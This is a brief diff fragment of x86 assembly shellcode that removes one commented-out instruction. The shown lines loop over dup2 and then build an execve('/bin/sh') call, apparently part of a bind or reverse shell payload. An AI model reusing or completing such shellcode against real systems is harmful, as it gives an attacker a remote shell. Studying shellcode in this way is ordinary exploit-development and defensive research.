@@ -53,7 +53,6 @@ _start:
 	jnz dup2
 
 	;execve("/bin/sh",NULL,NULL);{
-	; inc ecx
 	mul ecx
 	push ecx
 	push 0x68732f6e
